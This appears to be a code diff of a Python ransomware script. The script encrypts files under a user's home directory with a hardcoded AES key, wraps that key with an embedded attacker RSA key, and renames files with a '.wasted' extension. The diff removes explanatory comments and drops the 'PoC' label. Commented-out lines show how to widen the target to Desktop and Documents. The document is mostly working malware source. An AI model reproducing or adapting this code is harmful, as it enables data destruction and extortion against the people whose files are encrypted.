@@ -12,12 +12,7 @@ import platform
 import discover
 import modify
 
-# -----------------
-# GLOBAL VARIABLES
-# CHANGE IF NEEDED
-# -----------------
-#  set to either: '128/192/256 bit plaintext key' or False
-HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # AES 256-key used to encrypt files
+HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  
 SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
 xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
@@ -26,7 +21,7 @@ GhYcIZmJ7iT5aRCkXiKXrw+iIL6DT0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4re
 q/CydAWrsAJPhtEmObu6cn2FYFfwGmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkz
 vvYVc85DbQFK/Jcpeq0QkKiJ4Z+TWGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZg
 HwIDAQAB
------END PUBLIC KEY-----''' # Attacker's embedded public RSA key used to encrypt AES key
+-----END PUBLIC KEY-----''' 
 SERVER_PRIVATE_RSA_KEY = '''-----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAklmKLXGK6jfMis4ifjlBxSGMFCj1RtSA/sQxs4I5IWvMxYSD
 1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXTqPYmZW+TQjtrx4tG7ZHda65+EdyV
@@ -53,31 +48,29 @@ fTP4iR+dcCRjINej2DVzfm4QsWN/DUuoNdKZm5sSb7DNyJQnz94SM/r5uxTZ+72U
 MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
 14roox6zaAk8fEZ/nkS86evh6PqjfhSuniBoqvQllAPZTXdOm8KPchNU8VC+iSzw
 +IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
------END RSA PRIVATE KEY-----''' # SHOULD NOT BE INCLUDED - only for decryptor purposes
-extension = ".wasted" # Ransomware custom extension
+-----END RSA PRIVATE KEY-----''' 
+extension = ".wasted" 
 
 
 def parse_args():
-    parser = argparse.ArgumentParser(description='Ransomware PoC')
+    parser = argparse.ArgumentParser(description='Ransomware')
     parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")
 
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
+    group.add_argument('-e', '--encrypt', help='Encrypt files',
                         action='store_true')
-    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
+    group.add_argument('-d', '--decrypt', help='Decrypt files',
                         action='store_true')
 
     return parser.parse_args()
 
 def main():
     if len(sys.argv) <= 1:
-        print('[*] Ransomware - PoC\n')
-        # banner()
+        print('[*] Ransomware\n')
         print('Usage: python3 main.py -h')
         print('{} -h for help.'.format(sys.argv[0]))
         exit(0)
 
-    # Parse arguments
     args = parse_args()
     encrypt = args.encrypt
     decrypt = args.decrypt
@@ -92,13 +85,11 @@ def main():
     if absolute_path != 'None':
         startdirs = [absolute_path]
     else:
-        # Check OS
         plt = platform.system()
         if plt == "Linux" or plt == "Darwin":
             startdirs = [os.environ['HOME'] + '/test_ransomware']
         elif plt == "Windows":
             startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
-            # Can also hardcode additional directories
             # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
                         # os.environ['USERPROFILE'] + '\\Documents',
                         # os.environ['USERPROFILE'] + '\\Music',
@@ -108,7 +99,6 @@ def main():
             print("Unidentified system")
             exit(0)
 
-    # Encrypt AES key with attacker's embedded RSA public key 
     server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
     encryptor = PKCS1_OAEP.new(server_key)
     encrypted_key = encryptor.encrypt(HARDCODED_KEY)
@@ -127,16 +117,13 @@ def main():
             "KEEP IT\n".format(SERVER_PUBLIC_RSA_KEY))
         key = HARDCODED_KEY
     if decrypt:
-        # # RSA Decryption function - warning that private key is hardcoded for testing purposes
         rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
         decryptor = PKCS1_OAEP.new(rsa_key)
         key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))
            
-    # Create AES counter and AES cipher
     ctr = Counter.new(128)
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
 
-    # Recursively go through folders and encrypt/decrypt files
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
             if encrypt and not file.endswith(extension):
@@ -149,8 +136,6 @@ def main():
                 os.rename(file, file_original)
                 print("File changed from " + file + " to " + file_original)
                 
-    # This wipes the key out of memory
-    # to avoid recovery by third party tools
     for _ in range(100):
         #key = random(32)
         pass
